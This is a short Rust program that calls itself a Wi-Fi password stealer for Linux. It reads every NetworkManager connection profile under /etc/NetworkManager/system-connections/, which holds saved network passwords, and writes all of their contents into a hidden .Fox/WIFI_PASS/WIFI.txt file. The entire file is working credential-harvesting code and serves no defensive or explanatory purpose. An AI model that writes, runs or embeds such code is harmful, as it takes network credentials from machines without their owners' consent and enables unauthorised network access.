use std::fs;
use std::fs::File;
use std::io::prelude::*;
use std::io::{BufWriter, Write};

fn main() {
    let paths = fs::read_dir("/etc/NetworkManager/system-connections/").unwrap();
    fs::create_dir_all(".Fox").expect("Error! File exist.\n");
    fs::create_dir_all(".Fox/WIFI_PASS").expect("Error! File exist.\n");
    let file_name = File::create(".Fox/WIFI_PASS/WIFI.txt").expect("Error! File exist.\n");
    let mut file_name = BufWriter::new(file_name);
    for index in paths {
        write!(file_name, "{}", steal_wifi_pas(index.unwrap().path().display().to_string())).expect("Unable to write file");
    }
}

//Steal WIFI Password On Linux
fn steal_wifi_pas(source: String) -> String {
    let mut files = File::open(&source).expect("Error! No file.");
    let mut context: String = String::new();
    files.read_to_string(&mut context).expect("Error! Not readable.");
    return context;
}
